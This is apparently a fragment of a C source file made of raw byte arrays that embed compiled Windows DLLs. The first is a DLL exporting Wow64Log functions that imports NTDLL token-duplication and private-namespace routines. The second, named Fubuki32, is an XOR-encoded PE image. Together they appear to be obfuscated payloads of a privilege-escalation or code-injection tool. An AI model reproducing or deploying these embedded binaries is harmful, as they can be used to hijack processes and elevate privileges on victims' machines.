	0x1C, 0x35, 0x00, 0x00, 0x21, 0x00, 0x02, 0x00, 0x00, 0x74, 0x0A, 0x00, 0x10, 0x1D, 0x00, 0x00,
	0x9D, 0x1D, 0x00, 0x00, 0x1C, 0x35, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0x10, 0x1D, 0x00, 0x00,
	0x9D, 0x1D, 0x00, 0x00, 0x1C, 0x35, 0x00, 0x00, 0x01, 0x0D, 0x05, 0x00, 0x0D, 0x34, 0x73, 0x00,
	0x0D, 0x01, 0x6E, 0x00, 0x06, 0x70, 0x00, 0x00, 0x21, 0x17, 0x04, 0x00, 0x17, 0x64, 0x72, 0x00,
	0x08, 0x54, 0x71, 0x00, 0x70, 0x1E, 0x00, 0x00, 0x87, 0x1F, 0x00, 0x00, 0x78, 0x35, 0x00, 0x00,
	0x21, 0x00, 0x00, 0x00, 0x70, 0x1E, 0x00, 0x00, 0x87, 0x1F, 0x00, 0x00, 0x78, 0x35, 0x00, 0x00,
	0x02, 0x02, 0x04, 0x00, 0x03, 0x16, 0x00, 0x06, 0x02, 0x60, 0x01, 0x70, 0x00, 0x00, 0x00, 0x00,
	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x20, 0x36, 0x00, 0x00,
	0x01, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xF8, 0x35, 0x00, 0x00,
	0x08, 0x36, 0x00, 0x00, 0x18, 0x36, 0x00, 0x00, 0x00, 0x1D, 0x00, 0x00, 0x70, 0x20, 0x00, 0x00,
	0x00, 0x1D, 0x00, 0x00, 0x00, 0x1D, 0x00, 0x00, 0x2C, 0x36, 0x00, 0x00, 0x3F, 0x36, 0x00, 0x00,
	0x56, 0x36, 0x00, 0x00, 0x6C, 0x36, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x02, 0x00, 0x03, 0x00,
	0x70, 0x70, 0x69, 0x65, 0x78, 0x74, 0x31, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x57, 0x6F, 0x77, 0x36,
	0x34, 0x4C, 0x6F, 0x67, 0x49, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x65, 0x00, 0x57,
	0x6F, 0x77, 0x36, 0x34, 0x4C, 0x6F, 0x67, 0x4D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x41, 0x72,
	0x67, 0x4C, 0x69, 0x73, 0x74, 0x00, 0x57, 0x6F, 0x77, 0x36, 0x34, 0x4C, 0x6F, 0x67, 0x53, 0x79,
	0x73, 0x74, 0x65, 0x6D, 0x53, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x00, 0x57, 0x6F, 0x77, 0x36,
	0x34, 0x4C, 0x6F, 0x67, 0x54, 0x65, 0x72, 0x6D, 0x69, 0x6E, 0x61, 0x74, 0x65, 0x00, 0x00, 0x00,
	0xC0, 0x36, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2E, 0x38, 0x00, 0x00,
	0x00, 0x30, 0x00, 0x00, 0xE0, 0x36, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xF8, 0x3A, 0x00, 0x00, 0x20, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xF0, 0x37, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0C, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x1A, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x3C, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5C, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x72, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x86, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x98, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAC, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xC2, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE0, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xEE, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0C, 0x39, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x24, 0x39, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3C, 0x39, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x5A, 0x39, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x74, 0x39, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x88, 0x39, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA0, 0x39, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xAA, 0x39, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB8, 0x39, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xCA, 0x39, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD8, 0x39, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xEA, 0x39, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF8, 0x39, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x0C, 0x3A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1A, 0x3A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x32, 0x3A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4A, 0x3A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x64, 0x3A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x84, 0x3A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x94, 0x3A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAC, 0x3A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xC2, 0x3A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD0, 0x3A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xE4, 0x3A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x41, 0x01, 0x44, 0x69, 0x73, 0x61, 0x62, 0x6C, 0x65, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x4C,
	0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x43, 0x61, 0x6C, 0x6C, 0x73, 0x00, 0x85, 0x01, 0x45, 0x78,
	0x69, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x00, 0xA4, 0x02, 0x47, 0x65, 0x74, 0x4D,
	0x6F, 0x64, 0x75, 0x6C, 0x65, 0x48, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x57, 0x00, 0x00, 0x4B, 0x45,
	0x52, 0x4E, 0x45, 0x4C, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0x7D, 0x04, 0x52, 0x74,
	0x6C, 0x49, 0x6D, 0x61, 0x67, 0x65, 0x44, 0x69, 0x72, 0x65, 0x63, 0x74, 0x6F, 0x72, 0x79, 0x45,
	0x6E, 0x74, 0x72, 0x79, 0x54, 0x6F, 0x44, 0x61, 0x74, 0x61, 0x00, 0x00, 0xB9, 0x01, 0x4E, 0x74,
	0x4F, 0x70, 0x65, 0x6E, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x54, 0x6F, 0x6B, 0x65, 0x6E,
	0x00, 0x00, 0xA8, 0x04, 0x52, 0x74, 0x6C, 0x49, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x69, 0x7A,
	0x65, 0x53, 0x69, 0x64, 0x00, 0x00, 0xE7, 0x02, 0x52, 0x74, 0x6C, 0x41, 0x6C, 0x6C, 0x6F, 0x63,
	0x61, 0x74, 0x65, 0x48, 0x65, 0x61, 0x70, 0x00, 0x5B, 0x01, 0x4E, 0x74, 0x44, 0x75, 0x70, 0x6C,
	0x69, 0x63, 0x61, 0x74, 0x65, 0x54, 0x6F, 0x6B, 0x65, 0x6E, 0x00, 0x00, 0x0B, 0x06, 0x52, 0x74,
	0x6C, 0x53, 0x75, 0x62, 0x41, 0x75, 0x74, 0x68, 0x6F, 0x72, 0x69, 0x74, 0x79, 0x53, 0x69, 0x64,
	0x00, 0x00, 0x54, 0x03, 0x52, 0x74, 0x6C, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x42, 0x6F, 0x75,
	0x6E, 0x64, 0x61, 0x72, 0x79, 0x44, 0x65, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x6F, 0x72, 0x00,
	0xAA, 0x01, 0x4E, 0x74, 0x4F, 0x70, 0x65, 0x6E, 0x45, 0x76, 0x65, 0x6E, 0x74, 0x00, 0x87, 0x03,
	0x52, 0x74, 0x6C, 0x44, 0x65, 0x6C, 0x65, 0x74, 0x65, 0x42, 0x6F, 0x75, 0x6E, 0x64, 0x61, 0x72,
	0x79, 0x44, 0x65, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x6F, 0x72, 0x00, 0x5F, 0x02, 0x4E, 0x74,
	0x53, 0x65, 0x74, 0x49, 0x6E, 0x66, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x54, 0x6F,
	0x6B, 0x65, 0x6E, 0x00, 0x92, 0x04, 0x52, 0x74, 0x6C, 0x49, 0x6E, 0x69, 0x74, 0x55, 0x6E, 0x69,
	0x63, 0x6F, 0x64, 0x65, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x00, 0x00, 0xE4, 0x02, 0x52, 0x74,
	0x6C, 0x41, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x41, 0x6E, 0x64, 0x49, 0x6E, 0x69, 0x74,
	0x69, 0x61, 0x6C, 0x69, 0x7A, 0x65, 0x53, 0x69, 0x64, 0x00, 0xED, 0x01, 0x4E, 0x74, 0x51, 0x75,
	0x65, 0x72, 0x79, 0x49, 0x6E, 0x66, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x54, 0x6F,
	0x6B, 0x65, 0x6E, 0x00, 0x4A, 0x01, 0x4E, 0x74, 0x44, 0x65, 0x6C, 0x61, 0x79, 0x45, 0x78, 0x65,
	0x63, 0x75, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x00, 0xFA, 0x04, 0x52, 0x74, 0x6C, 0x4C, 0x65, 0x6E,
	0x67, 0x74, 0x68, 0x52, 0x65, 0x71, 0x75, 0x69, 0x72, 0x65, 0x64, 0x53, 0x69, 0x64, 0x00, 0x00,
	0x03, 0x01, 0x4E, 0x74, 0x43, 0x6C, 0x6F, 0x73, 0x65, 0x00, 0x16, 0x04, 0x52, 0x74, 0x6C, 0x46,
	0x72, 0x65, 0x65, 0x53, 0x69, 0x64, 0x00, 0x00, 0x2E, 0x03, 0x52, 0x74, 0x6C, 0x43, 0x6F, 0x6D,
	0x70, 0x75, 0x74, 0x65, 0x43, 0x72, 0x63, 0x33, 0x32, 0x00, 0x4D, 0x02, 0x4E, 0x74, 0x53, 0x65,
	0x74, 0x45, 0x76, 0x65, 0x6E, 0x74, 0x00, 0x00, 0x29, 0x01, 0x4E, 0x74, 0x43, 0x72, 0x65, 0x61,
	0x74, 0x65, 0x4D, 0x75, 0x74, 0x61, 0x6E, 0x74, 0x00, 0x00, 0x12, 0x04, 0x52, 0x74, 0x6C, 0x46,
	0x72, 0x65, 0x65, 0x48, 0x65, 0x61, 0x70, 0x00, 0xCD, 0x01, 0x4E, 0x74, 0x50, 0x72, 0x69, 0x76,
	0x69, 0x6C, 0x65, 0x67, 0x65, 0x43, 0x68, 0x65, 0x63, 0x6B, 0x00, 0x00, 0xD3, 0x03, 0x52, 0x74,
	0x6C, 0x45, 0x71, 0x75, 0x61, 0x6C, 0x53, 0x69, 0x64, 0x00, 0x2A, 0x05, 0x52, 0x74, 0x6C, 0x4E,
	0x74, 0x53, 0x74, 0x61, 0x74, 0x75, 0x73, 0x54, 0x6F, 0x44, 0x6F, 0x73, 0x45, 0x72, 0x72, 0x6F,
	0x72, 0x00, 0x96, 0x02, 0x4E, 0x74, 0x55, 0x6E, 0x6D, 0x61, 0x70, 0x56, 0x69, 0x65, 0x77, 0x4F,
	0x66, 0x53, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x00, 0xB7, 0x01, 0x4E, 0x74, 0x4F, 0x70,
	0x65, 0x6E, 0x50, 0x72, 0x69, 0x76, 0x61, 0x74, 0x65, 0x4E, 0x61, 0x6D, 0x65, 0x73, 0x70, 0x61,
	0x63, 0x65, 0x00, 0x00, 0xDD, 0x02, 0x52, 0x74, 0x6C, 0x41, 0x64, 0x64, 0x53, 0x49, 0x44, 0x54,
	0x6F, 0x42, 0x6F, 0x75, 0x6E, 0x64, 0x61, 0x72, 0x79, 0x44, 0x65, 0x73, 0x63, 0x72, 0x69, 0x70,
	0x74, 0x6F, 0x72, 0x00, 0xBD, 0x01, 0x4E, 0x74, 0x4F, 0x70, 0x65, 0x6E, 0x53, 0x65, 0x63, 0x74,
	0x69, 0x6F, 0x6E, 0x00, 0xDB, 0x05, 0x52, 0x74, 0x6C, 0x53, 0x65, 0x74, 0x4C, 0x61, 0x73, 0x74,
	0x57, 0x69, 0x6E, 0x33, 0x32, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x00, 0x00, 0x9E, 0x01, 0x4E, 0x74,
	0x4D, 0x61, 0x70, 0x56, 0x69, 0x65, 0x77, 0x4F, 0x66, 0x53, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E,
	0x00, 0x00, 0x8A, 0x00, 0x4C, 0x64, 0x72, 0x4C, 0x6F, 0x61, 0x64, 0x44, 0x6C, 0x6C, 0x00, 0x00,
	0x7B, 0x00, 0x4C, 0x64, 0x72, 0x47, 0x65, 0x74, 0x44, 0x6C, 0x6C, 0x48, 0x61, 0x6E, 0x64, 0x6C,
	0x65, 0x45, 0x78, 0x00, 0x7E, 0x04, 0x52, 0x74, 0x6C, 0x49, 0x6D, 0x61, 0x67, 0x65, 0x4E, 0x74,
	0x48, 0x65, 0x61, 0x64, 0x65, 0x72, 0x00, 0x00, 0x6E, 0x74, 0x64, 0x6C, 0x6C, 0x2E, 0x64, 0x6C,
	0x6C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x10, 0x00, 0x00, 0x5A, 0x11, 0x00, 0x00, 0x30, 0x34, 0x00, 0x00, 0x60, 0x11, 0x00, 0x00,
	0xC4, 0x12, 0x00, 0x00, 0x38, 0x34, 0x00, 0x00, 0xD0, 0x12, 0x00, 0x00, 0x14, 0x13, 0x00, 0x00,
	0x48, 0x34, 0x00, 0x00, 0x14, 0x13, 0x00, 0x00, 0x84, 0x14, 0x00, 0x00, 0x58, 0x34, 0x00, 0x00,
	0x84, 0x14, 0x00, 0x00, 0x93, 0x14, 0x00, 0x00, 0x6C, 0x34, 0x00, 0x00, 0xA0, 0x14, 0x00, 0x00,
	0x3E, 0x15, 0x00, 0x00, 0x7C, 0x34, 0x00, 0x00, 0x40, 0x15, 0x00, 0x00, 0x5F, 0x15, 0x00, 0x00,
	0x88, 0x34, 0x00, 0x00, 0x60, 0x15, 0x00, 0x00, 0xC3, 0x16, 0x00, 0x00, 0x90, 0x34, 0x00, 0x00,
	0xC3, 0x16, 0x00, 0x00, 0xCB, 0x16, 0x00, 0x00, 0xA4, 0x34, 0x00, 0x00, 0xCB, 0x16, 0x00, 0x00,
	0xBF, 0x1A, 0x00, 0x00, 0xB8, 0x34, 0x00, 0x00, 0xBF, 0x1A, 0x00, 0x00, 0x01, 0x1B, 0x00, 0x00,
	0xCC, 0x34, 0x00, 0x00, 0x01, 0x1B, 0x00, 0x00, 0x33, 0x1B, 0x00, 0x00, 0xDC, 0x34, 0x00, 0x00,
	0x40, 0x1B, 0x00, 0x00, 0xCD, 0x1B, 0x00, 0x00, 0xEC, 0x34, 0x00, 0x00, 0xCD, 0x1B, 0x00, 0x00,
	0xAB, 0x1C, 0x00, 0x00, 0xF8, 0x34, 0x00, 0x00, 0xAB, 0x1C, 0x00, 0x00, 0xCC, 0x1C, 0x00, 0x00,
	0x0C, 0x35, 0x00, 0x00, 0x10, 0x1D, 0x00, 0x00, 0x9D, 0x1D, 0x00, 0x00, 0x1C, 0x35, 0x00, 0x00,
	0x9D, 0x1D, 0x00, 0x00, 0x3B, 0x1E, 0x00, 0x00, 0x24, 0x35, 0x00, 0x00, 0x3B, 0x1E, 0x00, 0x00,
	0x4E, 0x1E, 0x00, 0x00, 0x3C, 0x35, 0x00, 0x00, 0x4E, 0x1E, 0x00, 0x00, 0x5C, 0x1E, 0x00, 0x00,
	0x54, 0x35, 0x00, 0x00, 0x5C, 0x1E, 0x00, 0x00, 0x64, 0x1E, 0x00, 0x00, 0x68, 0x35, 0x00, 0x00,
	0x70, 0x1E, 0x00, 0x00, 0x87, 0x1F, 0x00, 0x00, 0x78, 0x35, 0x00, 0x00, 0x87, 0x1F, 0x00, 0x00,
	0x1B, 0x20, 0x00, 0x00, 0x88, 0x35, 0x00, 0x00, 0x1B, 0x20, 0x00, 0x00, 0x42, 0x20, 0x00, 0x00,
	0xA0, 0x35, 0x00, 0x00, 0x50, 0x20, 0x00, 0x00, 0x6F, 0x20, 0x00, 0x00, 0x88, 0x34, 0x00, 0x00,
	0x70, 0x20, 0x00, 0x00, 0x9B, 0x20, 0x00, 0x00, 0x88, 0x34, 0x00, 0x00, 0xC0, 0x20, 0x00, 0x00,
	0xD0, 0x20, 0x00, 0x00, 0xB0, 0x35, 0x00, 0x00, 0xD0, 0x20, 0x00, 0x00, 0x3D, 0x27, 0x00, 0x00,
	0xC0, 0x35, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};
#endif

static const unsigned char g_resourceFubuki32[26112] = {
	0xE6, 0xF1, 0x3B, 0xAB, 0xA8, 0xAB, 0xAB, 0xAB, 0xAF, 0xAB, 0xAB, 0xAB, 0x54, 0x54, 0xAB, 0xAB,
	0x13, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xEB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB,
	0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB,
	0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0xAB, 0x5B, 0xAB, 0xAB, 0xAB,
	0xA5, 0xB4, 0x11, 0xA5, 0xAB, 0x1F, 0xA2, 0x66, 0x8A, 0x13, 0xAA, 0xE7, 0x66, 0x8A, 0xFF, 0xC3,
	0xC2, 0xD8, 0x8B, 0xDB, 0xD9, 0xC4, 0xCC, 0xD9, 0xCA, 0xC6, 0x8B, 0xC8, 0xCA, 0xC5, 0xC5, 0xC4,
	0xDF, 0x8B, 0xC9, 0xCE, 0x20, 0x72, 0x75, 0x6E, 0x20, 0x69, 0x6E, 0x20, 0x44, 0x4F, 0x53, 0x20,
	0x6D, 0x6F, 0x64, 0x65, 0x2E, 0x0D, 0x0D, 0x0A, 0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
